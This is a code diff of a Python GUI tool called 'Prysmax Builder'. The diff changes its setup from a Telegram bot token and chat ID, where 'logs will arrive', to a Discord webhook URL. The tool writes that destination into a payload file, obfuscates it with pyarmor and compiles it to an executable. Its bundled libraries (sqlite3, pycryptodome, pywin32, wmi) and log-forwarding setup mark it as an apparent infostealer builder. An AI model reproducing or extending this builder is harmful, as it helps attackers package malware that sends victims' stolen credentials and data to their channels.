@@ -1,29 +1,12 @@
-# 2024!!
-
 import os
 import subprocess
-import re
-import shutil
-import fileinput
 import PySimpleGUI as sg
-
-def modificar_archivo(file_path, token, chat_id):
-    prysmax_pattern = re.compile(r'prysmax\s*=\s*"[^"]*"')
-    chat_id_pattern = re.compile(r'chat_id\s*=\s*"[^"]*"')
-
-    with fileinput.FileInput(file_path, inplace=True, backup='', encoding='utf-8') as file:
-        for line in file:
-            print(prysmax_pattern.sub(f'prysmax = "{token}"', line), end='')
-
-    with fileinput.FileInput(file_path, inplace=True, backup='', encoding='utf-8') as file:
-        for line in file:
-            print(chat_id_pattern.sub(f'chat_id = "{chat_id}"', line), end='')
 
 def download_libraries():
     required_libraries = [
         'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
-        'subprocess', 'pyarmor==7.6.1', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 'zipfile', 'python-telegram-bot',
-        'pycryptodomex', 'pycryptodome','datetime', "pywin32", "pycrypto"
+        'subprocess', 'pyarmor==7.6.1', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 
+        'zipfile', 'discord-webhook', 'pycryptodomex', 'pycryptodome', 'datetime', 'pywin32'
     ]
 
     for library in required_libraries:
@@ -33,7 +16,7 @@ def download_libraries():
             print(f"{library} not found. Downloading...")
             subprocess.check_call(['pip', 'install', library])
 
-def compile_and_explore(token, id_chat):
+def compile_and_explore(webhook_url):
     if not os.path.exists("prysmax1builder"):
         os.makedirs("prysmax1builder")
 
@@ -41,11 +24,12 @@ def compile_and_explore(token, id_chat):
     with open("main.py", 'r', encoding='utf-8') as main_file:
         main_content = main_file.read()
 
+    # Replace the placeholder with the user-provided webhook URL
+    main_content = main_content.replace('theapi2023 = "Here-Token"', f'theapi2023 = "{webhook_url}"')
+
     file_path = os.path.join("prysmax1builder", "main.py")
     with open(file_path, 'w', encoding='utf-8') as new_main_file:
         new_main_file.write(main_content)
-
-    modificar_archivo(file_path, token, id_chat)
 
     here = sg.popup_yes_no("Are you sure you want to compile your file to Executable?", title='Confirm Compilation', button_color=('white', 'purple'))
     if here == 'Yes':
@@ -61,17 +45,16 @@ def compile_and_explore(token, id_chat):
         print("Compilation canceled.")
 
 def main():
-    sg.theme('DarkGrey1')
-    sg.set_options(font=('Arial', 12))
+    sg.theme('DarkPurple4')  # Purple theme
+    sg.set_options(font=('Helvetica', 12))
 
     layout = [
-        [sg.Text('Prysmax Builder', font=('Arial', 24), text_color='white', justification='right')],
-        [sg.Text('Enter the token of @botfather in telegram (Your bot lol):', text_color='white'), sg.InputText(key='token')],
-        [sg.Text('Enter the ID of the chat where the logs will arrive:', text_color='white'), sg.InputText(key='id_chat')],
-        [sg.Button('Download Libraries', button_color=('white', 'green')), sg.Button('Compile and Explore', button_color=('black', 'white')), sg.Button('Exit', button_color=('white', 'red'))],
+        [sg.Text('Prysmax Builder', font=('Helvetica', 24), text_color='white', justification='center')],
+        [sg.Text('Enter your Discord Webhook URL:', text_color='white'), sg.InputText(key='webhook_url')],
+        [sg.Button('Download Libraries', button_color=('white', 'purple')), sg.Button('Compile and Explore', button_color=('white', 'purple')), sg.Button('Exit', button_color=('white', 'red'))],
     ]
 
-    window = sg.Window('Prysmax Builder', layout, alpha_channel=0.7, grab_anywhere=True)
+    window = sg.Window('Prysmax Builder', layout, alpha_channel=0.8, grab_anywhere=True)
 
     while True:
         event, values = window.read()
@@ -82,9 +65,8 @@ def main():
             download_libraries()
             sg.popup("Libraries downloaded successfully!", text_color='white')
         elif event == 'Compile and Explore':
-            token = values['token']
-            id_chat = values['id_chat']
-            compile_and_explore(token, id_chat)
+            webhook_url = values['webhook_url']
+            compile_and_explore(webhook_url)
 
     window.close()
 
